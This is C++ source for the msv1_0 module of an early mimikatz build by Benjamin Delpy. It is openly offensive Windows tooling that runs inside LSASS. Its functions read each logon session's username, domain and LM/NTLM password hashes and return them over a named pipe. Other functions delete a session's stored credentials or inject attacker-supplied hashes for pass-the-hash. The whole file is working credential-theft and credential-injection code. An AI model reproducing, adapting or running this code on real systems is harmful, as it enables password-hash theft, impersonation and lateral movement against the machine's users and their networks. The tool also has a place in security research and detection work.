/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence    : http://creativecommons.org/licenses/by-nc-sa/3.0/
	This file  : http://creativecommons.org/licenses/by/3.0/
*/
#include "msv1_0.h"

bool searchMSVFuncs()
{
	if(!MSV1_0_MspAuthenticationPackageId)
			MSV1_0_MspAuthenticationPackageId = (mod_system::GLOB_Version.dwBuildNumber < 7000) ? 2 : 3;
	return (searchLSAFuncs() && (MSV1_0_MspAuthenticationPackageId != 0));
}

__kextdll bool __cdecl getMSVFunctions(mod_pipe * monPipe, vector<wstring> * mesArguments)
{
	wostringstream monStream;
	monStream << L"** lsasrv.dll ** ; Research Status : " << (searchMSVFuncs() ? L"OK :)" : L"KO :(") << L" - " << MSV1_0_MspAuthenticationPackageId << endl <<
		L"@GetCredentials     = " << SeckPkgFunctionTable->GetCredentials << endl <<
		L"@AddCredential      = " << SeckPkgFunctionTable->AddCredential << endl <<
		L"@DeleteCredential   = " << SeckPkgFunctionTable->DeleteCredential << endl <<
		L"@LsaUnprotectMemory = " << SeckPkgFunctionTable->LsaUnprotectMemory <<endl <<
		L"@LsaProtectMemory   = " << SeckPkgFunctionTable->LsaProtectMemory << endl;

	return sendTo(monPipe, monStream.str());
}

__kextdll bool __cdecl getMSV(mod_pipe * monPipe, vector<wstring> * mesArguments)
{
	vector<pair<PFN_ENUM_BY_LUID, wstring>> monProvider;
	monProvider.push_back(make_pair<PFN_ENUM_BY_LUID, wstring>(getMSVLogonData, wstring(L"msv1_0")));
	return getLogonData(monPipe, mesArguments, &monProvider);
}

bool WINAPI getMSVLogonData(__in PLUID logId, __in mod_pipe * monPipe, __in bool justSecurity)
{
	wostringstream maReponse;
	if(searchMSVFuncs())
	{
		unsigned short reservedSize = 0;
		PMSV1_0_PRIMARY_CREDENTIAL kiwiCreds = NULL;
		if(NT_SUCCESS(NlpGetPrimaryCredential(logId, &kiwiCreds, &reservedSize)))
		{
			wstring lmHash = mod_text::stringOfHex(kiwiCreds->LmOwfPassword, sizeof(kiwiCreds->LmOwfPassword));
			wstring ntHash = mod_text::stringOfHex(kiwiCreds->NtOwfPassword, sizeof(kiwiCreds->NtOwfPassword));

			if(justSecurity)
				maReponse << L"lm{ " << lmHash << L" }, ntlm{ " << ntHash << L" }";
			else
			{
				maReponse << endl <<
					L"\t * Username     : " << mod_text::stringOfSTRING(kiwiCreds->UserName) << endl <<
					L"\t * Domain       : " << mod_text::stringOfSTRING(kiwiCreds->LogonDomainName) << endl <<
					L"\t * LM Hash      : " << lmHash << endl <<
					L"\t * NTLM Hash    : " << ntHash;
			}
			SeckPkgFunctionTable->FreeLsaHeap(kiwiCreds);
		}
		else maReponse << L"n.t. (LUID KO)";
	}
	else maReponse << L"n.a. (msv KO)";

	return sendTo(monPipe, maReponse.str());
}

__kextdll bool __cdecl getLogonSessions(mod_pipe * monPipe, vector<wstring> * mesArguments)
{
	return getMSV(monPipe, mesArguments);
}

__kextdll bool __cdecl delLogonSession(mod_pipe * monPipe, vector<wstring> * mesArguments)
{
	wostringstream maReponse;
	if(searchMSVFuncs())
	{
		if(!mesArguments->empty() && mesArguments->size() >= 1 && mesArguments->size() <= 2)
		{
			wstring idSecAppHigh = L"0";
			wstring idSecAppLow = mesArguments->front();
			if(mesArguments->size() > 1)
			{
				idSecAppHigh = mesArguments->front(); idSecAppLow = mesArguments->back();
			}

			LUID idApp = mod_text::wstringsToLUID(idSecAppHigh, idSecAppLow);
			if(idApp.LowPart != 0 || idApp.HighPart != 0)
				maReponse << (NT_SUCCESS(NlpDeletePrimaryCredential(&idApp)) ? L"Deleting data from successful security :)" : L"Deleting data security failure :(");
			else maReponse << L"LUID incorrect !";
		}
		else maReponse << L"Format invalid call: delLogonSession [idSecAppHigh] idSecAppLow";
	}
	else maReponse << L"n.a. (msv KO)";

	maReponse << endl;
	return sendTo(monPipe, maReponse.str());
}

__kextdll bool __cdecl addLogonSession(mod_pipe * monPipe, vector<wstring> * mesArguments)
{
	wostringstream maReponse;
	if(searchMSVFuncs())
	{
		if(!mesArguments->empty() && mesArguments->size() >= 4 && mesArguments->size() <= 6)
		{
			MSV1_0_PRIMARY_CREDENTIAL kiwicreds;
			RtlZeroMemory(&kiwicreds, sizeof(MSV1_0_PRIMARY_CREDENTIAL));
			
			wstring idSecAppHigh = L"0", idSecAppLow, userName, domainName, lmHash, ntlmHash = mesArguments->back();
			kiwicreds.LmPasswordPresent = FALSE;
			kiwicreds.NtPasswordPresent = TRUE;

			switch(mesArguments->size()) // bad arguments users
			{
			case 4:
				idSecAppLow = mesArguments->front();
				userName = mesArguments->at(1);
				domainName = mesArguments->at(2);
				break;
			case 6:
				idSecAppHigh = mesArguments->front();
				idSecAppLow = mesArguments->at(1);
				userName = mesArguments->at(2);
				domainName = mesArguments->at(3);
				kiwicreds.LmPasswordPresent = TRUE;
				lmHash = mesArguments->at(4);
				break;
			case 5:
				if(mesArguments->at(3).size() == 0x20)
				{
					idSecAppLow = mesArguments->front();
					userName = mesArguments->at(1);
					domainName = mesArguments->at(2);
					kiwicreds.LmPasswordPresent = TRUE;
					lmHash = mesArguments->at(3);
				}
				else
				{
					idSecAppHigh = mesArguments->front();
					idSecAppLow = mesArguments->at(1);
					userName = mesArguments->at(2);
					domainName = mesArguments->at(3);
				}
				break;
			}

			LUID idApp = mod_text::wstringsToLUID(idSecAppHigh, idSecAppLow);

			if(idApp.LowPart != 0 || idApp.HighPart != 0)
			{
				if((!kiwicreds.LmPasswordPresent || (lmHash.size() == 0x20)) && ntlmHash.size() == 0x20 && userName.size() <= MAX_USERNAME_LEN && domainName.size() <= MAX_DOMAIN_LEN)
				{
					mod_text::InitLsaStringToBuffer(&kiwicreds.UserName, userName, kiwicreds.BuffUserName);
					mod_text::InitLsaStringToBuffer(&kiwicreds.LogonDomainName, domainName, kiwicreds.BuffDomaine);
					if(kiwicreds.LmPasswordPresent)
						mod_text::wstringHexToByte(lmHash, kiwicreds.LmOwfPassword);
					mod_text::wstringHexToByte(ntlmHash, kiwicreds.NtOwfPassword);

					maReponse << (NT_SUCCESS(NlpAddPrimaryCredential(&idApp, &kiwicreds, sizeof(kiwicreds))) ? L"Data injection successful security :)" : L"Injection security data failure :(");
				}
				else maReponse << L"LM and NTLM hashes should be 32 characters, the username and domain / mail maximum of 22 characters";
			}
			else maReponse << L"LUID incorrect !";
		}
		else maReponse << L"Format invalid call: addLogonSession [idSecAppHigh] {idSecAppLow User Domain | Post}[HashLM] HashNTLM";
	}
	else maReponse << L"n.a. (msv KO)";

	maReponse << endl;
	return sendTo(monPipe, maReponse.str());
}
